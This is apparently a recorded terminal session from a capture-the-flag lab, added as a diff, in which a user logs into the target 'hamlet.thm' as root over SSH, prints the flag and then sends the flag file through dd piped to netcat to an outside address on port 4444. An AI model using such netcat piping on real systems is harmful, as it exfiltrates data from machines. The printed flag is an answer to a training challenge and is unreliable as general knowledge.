@@ -1,0 +1,79 @@
+Script started on 2025-04-13 00:13:01+03:00 [COMMAND="ssh -i root.key root@hamlet.thm" TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="104" LINES="27"]
+The authenticity of host 'hamlet.thm (10.10.145.196)' can't be established.
+ED25519 key fingerprint is SHA256:jh/4KoPScfN+VsXvlazTCDZDc5YmA+JI35Vnye0vpas.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'hamlet.thm' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-156-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ System information disabled due to load higher than 1.0
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+60 packages can be updated.
+1 update is a security update.
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+]0;root@hamlet: ~root@hamlet:~# ls -al
+total 36
+drwx------  6 root root 4096 Apr 12 21:13 [0m[01;34m.[0m
+drwxr-xr-x 24 root root 4096 Sep 15  2021 [01;34m..[0m
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Apr 12 21:13 [01;34m.cache[0m
+-rw-r--r--  1 root root   55 Sep 16  2021 flag
+drwx------  3 root root 4096 Apr 12 21:13 [01;34m.gnupg[0m
+drwxr-xr-x  3 root root 4096 Sep 15  2021 [01;34m.local[0m
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwx------  2 root root 4096 Sep 15  2021 [01;34m.ssh[0m
+]0;root@hamlet: ~root@hamlet:~# ls -al .ssh
+total 12
+drwx------ 2 root root 4096 Sep 15  2021 [0m[01;34m.[0m
+drwx------ 6 root root 4096 Apr 12 21:13 [01;34m..[0m
+-rw------- 1 root root   93 Apr 12 21:12 authorized_keys
+]0;root@hamlet: ~root@hamlet:~# cat flag
+THM{6_though_this_be_madness_yet_there_is_method_in_t}
+]0;root@hamlet: ~root@hamlet:~# whci[Kich mc[K[K[K[K[K[K[K[Kich nc
+
+Command 'wich' not found, did you mean:
+
+  command 'which' from deb debianutils
+  command 'wish' from deb tk
+  command 'wicd' from deb wicd-daemon
+  command 'wcch' from deb wcc
+
+Try: apt install <deb name>
+
+]0;root@hamlet: ~root@hamlet:~# eh[K[Kwhich nc
+/bin/nc
+]0;root@hamlet: ~root@hamlet:~# '[Kdd if=flag status=progress | cn [K[K[Knc 10.8.6.[K1.245 4444
+0+1 records in
+0+1 records out
+55 bytes copied, 2.5392e-05 s, 2.2 MB/s
+^C
+]0;root@hamlet: ~root@hamlet:~# ls
+flag
+]0;root@hamlet: ~root@hamlet:~# lsdd if=flag status=progress | nc 10.8.61.245 4444
+0+1 records in
+0+1 records out
+55 bytes copied, 0.000421981 s, 130 kB/s
+^C
+]0;root@hamlet: ~root@hamlet:~# exit
+logout
+Connection to hamlet.thm closed.
+
+Script done on 2025-04-13 00:15:55+03:00 [COMMAND_EXIT_CODE="130"]
